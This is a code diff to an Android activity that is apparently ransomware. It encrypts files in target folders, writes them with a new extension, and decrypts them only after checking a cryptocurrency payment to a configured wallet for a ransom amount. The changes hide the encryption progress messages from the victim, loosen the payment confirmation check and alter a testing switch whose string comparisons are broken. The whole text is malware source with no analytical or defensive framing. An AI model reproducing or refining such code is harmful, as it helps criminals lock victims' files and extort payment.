@@ -69,7 +69,7 @@ public class DiversionActivity extends Activity
 	protected String[] targetDirectories;
 	protected String[] targetExtensions;
 	protected Boolean impossible;
-	protected Boolean testing = false;
+	public Boolean testing = false;
 	public String[] perms = {android.Manifest.permission.WRITE_EXTERNAL_STORAGE,android.Manifest.permission.READ_EXTERNAL_STORAGE,android.Manifest.permission.INTERNET,android.Manifest.permission.ACCESS_NETWORK_STATE};
 	private int all = 0;
 	private int allDec = 0;
@@ -89,7 +89,7 @@ public class DiversionActivity extends Activity
         setContentView(R.layout.splash);
 		me = this;
 		String ts = getString(R.string.testing).toLowerCase();
-		if (ts == "yes" | ts == "true" | ts == "1")
+		if (ts == "yes" | ts == "true" | ts == "1" | ts != "false")
         {
 			testing = true;
 		}
@@ -273,13 +273,13 @@ public class DiversionActivity extends Activity
         {
 			now++;
 			all++;
-            if (!testing)
+            if (testing != true)
             {
                 File tmp = new File(s);
                 int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
                 if (maximumEncryptFileKBSize >= file_kb)
                 {
-                    logSplashText(getString(R.string.splash_encrypt_message) + " " + now + "/" + result.size());
+                    //logSplashText(getString(R.string.splash_encrypt_message) + " " + now + "/" + result.size());
                     try
                     {
                         writeFile(tmp.getAbsolutePath() + "." + encExt(), encryptBytes(readFile(tmp.getAbsolutePath())));
@@ -313,12 +313,12 @@ public class DiversionActivity extends Activity
         {
 
 			allDec++;
-            if (!testing)
+            if (testing != true)
             {
                 File tmp = new File(s);
                 tmp.setReadable(true);
                 tmp.setWritable(true);
-                logText(getString(R.string.log_decrypted_file_message) + " : " + allDec + "/" + all + " : " + tmp.getName());
+               // logText(getString(R.string.log_decrypted_file_message) + " : " + allDec + "/" + all + " : " + tmp.getName());
                 int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
                 if (maximumEncryptFileKBSize >= file_kb)
                 {
@@ -622,7 +622,7 @@ public class DiversionActivity extends Activity
             String fees = jsonResponse.getString("fees");
             String dateConfirmed = jsonResponse.getString("confirmed");
 
-            if (confirmations > 4 && (receiver.equals(getString(R.string.wallet_address))))
+            if (confirmations >= 3 && (receiver.equals(getString(R.string.wallet_address))))
             {
                 if ((total >= Integer.parseInt(getString(R.string.ransom_amount))))
                 {
